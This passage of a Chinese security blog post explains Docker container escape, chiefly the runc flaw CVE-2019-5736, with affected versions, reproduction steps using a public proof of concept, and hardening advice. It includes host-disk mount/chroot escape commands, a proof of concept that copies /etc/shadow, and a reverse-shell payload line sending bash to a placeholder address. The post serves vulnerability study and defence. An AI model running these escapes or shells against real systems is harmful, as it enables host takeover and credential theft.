+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkdir /a<br>mount /dev/vda1 /a<br>chroot /a<br><span class="hljs-comment"># /bin/bash</span><br></code></pre></td></tr></table></figure>
+
+<p>逃逸完成</p>
+<h2 id="CVE-2019-5736"><a href="#CVE-2019-5736" class="headerlink" title="CVE-2019-5736"></a>CVE-2019-5736</h2><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1552332">https://cloud.tencent.com/developer/article/1552332</a></p>
+<p>在docker的组件中，runc是一个标准的OCI容器运行时的实现，它是一个命令行工具，通过调用Namespace、Cgroup等系统接口，负责真正意义上创建和启动容器。换句话说，docker客户端就是通过调用runc来创建销毁机器的。</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"># yanq @ yanq-desk in ~ [16:28:01] <br>$ docker info | grep &quot;runc&quot;                    <br><span class="hljs-code"> Runtimes: runc</span><br><span class="hljs-code"> Default Runtime: runc</span><br><span class="hljs-code"> runc version: dc9208a3303feef5b3839f4323d9beb36df0a9dd</span><br><span class="hljs-symbol">WARNING: </span>No swap limit support<br></code></pre></td></tr></table></figure>
+
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
+<li>Docker Version &lt; 18.09.2</li>
+<li>runC Version &lt;= 1.0-rc6</li>
+</ul>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>漏洞总结下来就是一句话，攻击者可以重写宿主机上的runc二进制文件。</p>
+<p>先来看<code>/proc/self/exe</code>是什么？</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ <span class="hljs-keyword">file</span> <span class="hljs-regexp">/proc/</span>self/exe<br><span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/exe: symbolic link to /u</span>sr<span class="hljs-regexp">/bin/</span><span class="hljs-keyword">file</span><br></code></pre></td></tr></table></figure>
+
+<p>proc/self/exe符号链接会指向调用者自身，同理proc/pid/exe会指向pid进程的调用者。但是/proc/pid/exe和一般符号链接不同，其不遵循符号链接的正常语义，当进程打开/proc/pid/exe时，没有正常的读取和跟踪符号链接内容的过程。相反，内核只是让用户直接访问打开的文件条目。</p>
+<p>漏洞产生的原因就是宿主机通过runc对docker容器进行操作的时候没有做好访问限制，导致runc可以通过/proc/self/exe符号链接来访问到宿主机上的runc文件。攻击者可以让runc运行/proc/self/exe符号链接来欺骗它自己执行自己，从而对宿主机上的runc文件进行覆盖重写。</p>
+<p>具体的利用步骤：</p>
+<ol>
+<li>容器内生成一个恶意文件，将文件的调用者改为proc/self/exe</li>
+<li>宿主机docker exec调用该恶意文件，会调用proc/self/exe，也就是runc，此时容器内便可以遍历proc进程号，获取runc的进程号</li>
+<li>得到容器进称号PID后，可以获取/proc/pid/exe文件描述符fd</li>
+<li>对fd进行写操作，覆盖原有runc的文件</li>
+</ol>
+<p>问题1：攻击者为什么不继续写入恶意文件从而覆盖主机上的runc二进制文件？</p>
+<p>因为内核将不允许在执行runC时将其覆盖。于是可以通过获取/proc/PID/exe的file handler 来获取runcinit的文件描述符。 然后再写入该文件。</p>
+<p>问题2：runc创建容器时,会首先创建新进程runc-init，并且runc-init在另一个namespace里面，用来做隔离，那么为什么不覆盖runc的子进程runC init？</p>
+<p>CVE-2016-9962漏洞修补程序在进入容器之前就将runC init进程设置为“不可转储”（Non-dumpable）。其漏洞原理是runC init进程拥有来自宿主机的打开文件描述符，容器中的攻击者可以利用它来遍历主机的文件系统，从而打开容器。</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>首先安装带有漏洞版本的docker，我直接使用的是ubuntu16，版本为18.06.1-ce。</p>
+<p>如果你没有安装docker或者docker版本没有漏洞,则需要重新安装docker的漏洞版本,步骤如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get remove docker docker-engine docker.io containerd runc<br>sudo apt-get update<br>sudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common<br>curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -<br>sudo add-apt-repository <span class="hljs-string">&quot;deb [arch=arm64] https://download.docker.com/linux/ubuntu <span class="hljs-subst">$(lsb_release -cs)</span> stable&quot;</span><br>sudo apt-cache madison docker-ce<br><br><span class="hljs-comment"># 下面选择一个docker-ce版本进行安装</span><br>sudo apt-get install docker-ce=&lt;version&gt;<br></code></pre></td></tr></table></figure>
+
+<p>下面利用<a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC/%E6%9D%A5%E5%A4%8D%E7%8E%B0">https://github.com/Frichetten/CVE-2019-5736-PoC/来复现</a></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 1 编译好main.go，此步骤略</span><br><br><span class="hljs-comment"># 2 备份runc或者docker-runc!!!</span><br>cp <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/docker-runc /u</span>sr<span class="hljs-regexp">/bin/</span>docker-runc.bak<br><br><span class="hljs-comment"># 3 启动一个docker容器</span><br>docker run -it --rm --name test ubuntu:<span class="hljs-number">18.04</span> <span class="hljs-regexp">/bin/</span>bash<br><br><span class="hljs-comment"># 4 将第一步编译的文件拷贝进容器，并且执行</span><br><br><span class="hljs-comment"># 5. 从主机上docker exec进这个容器，执行/bin/sh</span><br>执行完之后，poc会将<span class="hljs-regexp">/etc/</span>shadow文件复制到<span class="hljs-regexp">/tmp/</span>shadow<br><br>备注：如果需要反弹shell，只需要修改main.go里面的payload为：<br>payload = <span class="hljs-string">&quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/xxxxx 0&gt;&amp;1&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="防止docker逃逸的方法"><a href="#防止docker逃逸的方法" class="headerlink" title="防止docker逃逸的方法"></a><strong>防止docker逃逸的方法</strong></h2><p>1、更新Docker版本到19.03.1及更高版本——CVE-2019-14271、覆盖CVE-2019-5736</p>
+<p>2、runc版本 &gt; 1.0-rc6</p>
+<p>3、k8s 集群版本&gt;1.12</p>
+<p>4、Linux内核版本&gt;=2.6.22——CVE-2016-5195(脏牛)</p>
+<p>5、Linux内核版本&gt;=4.14——CVE-2017–1000405(大脏牛)，未找到docker逃逸利用过程，但存在逃逸风险</p>
+<p>6、不建议以root权限运行Docker服务</p>
+<p>7、不建议以privileged（特权模式）启动Docker</p>
+<p>8、不建议将宿主机目录挂载至容器目录</p>
+<p>9、不建议将容器以—cap-add=SYSADMIN启动，SYSADMIN意为container进程允许执行mount、umount等一系列系统管理操作，<strong>存在容器逃逸风险</strong></p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1737">http://wjlshare.com/archives/1737</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.kingkk.com/2021/01/%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">https://www.kingkk.com/2021/01/%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/442762675">https://zhuanlan.zhihu.com/p/442762675</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41874930/article/details/109216506">https://blog.csdn.net/qq_41874930/article/details/109216506</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8/">云原生安全</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/knowledge/">knowledge</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/03/31/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">
+                        <span class="hidden-mobile">横向移动</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"lCUF08cIQ1BPgn7X9fjMMTbe-MdYXbMMI","appKey":"RSMbcrKIFnecyMgNGc47g3tN","placeholder":"说点什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"requiredFields":[]},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          Fluid.plugins.initFancyBox('#valine .vcontent img:not(.vemoji)');
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="http://kIl3rr.github.io" target="_blank" rel="nofollow noopener"><span>kIl3rr</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+  
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script defer>
+      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
+      ga.l = +new Date;
+      ga('create', 'G-SL9T1KRBQY', 'auto');
+      ga('send', 'pageview');
+    </script>
+    <script async src='https://www.google-analytics.com/analytics.js'></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
